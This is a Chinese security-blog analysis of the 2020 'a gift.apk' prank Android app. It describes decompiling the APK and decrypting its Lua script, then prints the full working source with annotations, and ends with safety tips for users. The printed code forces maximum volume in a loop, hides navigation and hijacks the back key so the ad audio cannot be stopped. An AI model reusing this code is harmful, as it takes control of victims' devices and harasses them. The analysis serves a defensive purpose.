## 事件介绍

![](https://image.3001.net/images/20201015/1602743954_5f87ee9219e841bb9201f.jpg!small)

10月14日左右似乎全国高校课堂都出现了O泡果奶声音，这个魔性的文件名字是叫一份礼物.apk，但是只要发送给别人安装之后，打开就会立马大声播放o泡果奶的洗脑广告。

![1602724448_5f87a26004fd1b65805fd.png!small?1602724449608](https://image.3001.net/images/20201015/1602724448_5f87a26004fd1b65805fd.png!small?1602724449608)

该事件在知乎热搜榜排到第10名。

![1602724602_5f87a2fad2517b974dc96.png!small?1602724606645](https://image.3001.net/images/20201015/1602724602_5f87a2fad2517b974dc96.png!small?1602724606645)

## 安全分析

### 反编译

使用apktool box对软件进行反编译得到如下文件

![1602730788_5f87bb248b98492e117a8.png!small?1602730789766](https://image.3001.net/images/20201015/1602730788_5f87bb248b98492e117a8.png!small?1602730789766)

![1602730701_5f87bacd615b56ce601ad.png!small?1602730702547](https://image.3001.net/images/20201015/1602730701_5f87bacd615b56ce601ad.png!small?1602730702547)

### 源码解密

通过分析AndroidManifest.xml没发现什么恶意内容

![1602730830_5f87bb4e483161c986ac5.png!small?1602730831634](https://image.3001.net/images/20201015/1602730830_5f87bb4e483161c986ac5.png!small?1602730831634)

assets目录下存放了软件核心文件

![1602731118_5f87bc6e7860c22dd64ba.png!small?1602731119725](https://image.3001.net/images/20201015/1602731118_5f87bc6e7860c22dd64ba.png!small?1602731119725)

打开main.lua文件时乱码，因为作者在开发时对lua进行加密，通过两次解密拿到源码。

![1602742445_5f87e8ad2785ab8edae49.png!small?1602742446358](https://image.3001.net/images/20201015/1602742445_5f87e8ad2785ab8edae49.png!small?1602742446358)

第一次解密完还是乱码状态。

![1602742470_5f87e8c6c9e33d3fb5a64.png!small?1602742472065](https://image.3001.net/images/20201015/1602742470_5f87e8c6c9e33d3fb5a64.png!small?1602742472065)

第二次使用 LuadcGUI进行解密

![1602742537_5f87e909c38c20e6966f5.png!small?1602742538942](https://image.3001.net/images/20201015/1602742537_5f87e909c38c20e6966f5.png!small?1602742538942)

![1602742748_5f87e9dc969ad01d8cd42.png!small](https://image.3001.net/images/20201015/1602742748_5f87e9dc969ad01d8cd42.png!small)

源码分析

源码注释分析

    
    
    require("import")
    import("android.app.*")
    import("android.os.*")
    import("android.widget.*")
    import("android.view.*")
    import("android.view.View")
    import("android.content.Context")
    import("android.media.MediaPlayer")   //播放器
    import("android.media.AudioManager") //音量控制模块
    import("com.androlua.Ticker")        //定时触发
    activity.getSystemService(Context.AUDIO_SERVICE).setStreamVolume(AudioManager.STREAM_MUSIC, 15, AudioManager.FLAG_SHOW_UI)
    activity.getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_IMMERSIVE)
    m = MediaPlayer()
    m.reset()
    m.setDataSource(activity.getLuaDir() .. "/mc.mp3")  //加载mc.mp3因为文件（O泡果奶音乐）
    m.prepare()
    m.start()
    m.setLooping(true)
    ti = Ticker()   
    ti.Period = 10  //间隔10ms触发
    function ti.onTick()
      activity.getSystemService(Context.AUDIO_SERVICE).setStreamVolume(AudioManager.STREAM_MUSIC, 15, AudioManager.FLAG_SHOW_UI)
      activity.getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_IMMERSIVE)
    end
    ti.start()
    function onKeyDown(A0_0, A1_1)    //劫持按键
      if string.find(tostring(A1_1), "KEYCODE_BACK") ~= nil then   //劫持返回按键
        activity.getSystemService(Context.AUDIO_SERVICE).setStreamVolume(AudioManager.STREAM_MUSIC, 15, AudioManager.FLAG_SHOW_UI)    //声音调大最大
      end
      return true
    end
    

通过以上分析可以看出软件安装打开后，只要程序不推出就会一直播放O泡因为，关机键失灵、减音量键也失灵。

## 安全小提示

1、不清楚来路的软件不要装

2、软件安装到正规软件商城安装

3、提醒大家保护个人信息，不点、不传播不知名链接。

